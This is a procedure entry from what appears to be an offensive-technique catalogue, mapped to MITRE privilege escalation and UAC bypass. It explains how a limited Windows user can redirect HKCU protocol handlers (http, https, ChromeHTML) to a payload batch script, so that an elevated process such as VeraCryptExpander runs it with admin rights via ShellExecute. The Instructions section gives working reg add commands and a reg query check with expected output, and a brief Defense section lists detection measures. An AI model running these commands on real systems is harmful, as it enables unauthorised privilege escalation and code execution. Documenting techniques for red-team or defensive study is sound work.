---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - registry-tampering
  - hkcu-hijack
type: procedure
tools:
  - '[[tools/add-bat]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/set-registry-protocol-hijack]]'
verified: false
platforms:
  - Windows
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Bypass User Account Control]]'
updated_at: '2025-12-14T17:29:44.575Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Bypass User Account Control]]'
---
# Tamper-HKCU-Registry-Keys-for-Protocol-Hijacking

## Summary

This procedure modifies HKCU registry keys for browser protocol handlers (e.g., HTTP, ChromeHTML) to point to a malicious batch script, allowing hijacking of ShellExecute calls without triggering UAC.

## Description

A limited user can alter user-specific registry hives to redirect URL protocol handling to malstaller.bat. When an elevated process like VeraCryptExpander calls ShellExecute on a URL, it resolves via HKCU, executing the payload with admin rights. Targets include ChromeHTML, FirefoxURL, IE.HTTP, etc. This exploits the insecure use of ShellExecute in WinMain.cpp.

## Requirements

1. Limited user access to HKCU
2. Reg.exe available (standard on Windows)
3. add.bat script customized with username and paths

## Defense

Defensive measures and detection strategies:

- Monitor HKCU\Software\Classes modifications via audit policies
- Use secure ShellExecute alternatives like spawning low-priv explorer
- Deploy registry protection tools to block user hive tampering

## Objectives

1. Hijack multiple browser protocols
2. Ensure redirection includes URL parameter (%1)
3. Verify changes without elevation

## Instructions

### Step 1: Customize and Run add.bat

**Context**: The batch script automates reg add for multiple keys.

**Command** ([[commands/set-registry-protocol-hijack]]):

In add.bat, use:

```batch
reg add "HKCU\Software\Classes\http\shell\open\command" /ve /d "C:\Users\Temp\Desktop\malstaller.bat \"%1\"" /f
reg add "HKCU\Software\Classes\https\shell\open\command" /ve /d "C:\Users\Temp\Desktop\malstaller.bat \"%1\"" /f
reg add "HKCU\Software\Classes\ChromeHTML\shell\open\command" /ve /d "C:\Users\Temp\Desktop\malstaller.bat \"%1\"" /f
```

> Run add.bat as limited user. Expected output: "The operation completed successfully." for each reg add.

### Step 2: Verify Tampering

**Context**: Confirm keys are set correctly.

**Command** (reg query):

```bash
reg query "HKCU\Software\Classes\http\shell\open\command" /ve
```

> Output shows default value pointing to malstaller.bat. Success: Value matches hijack string.
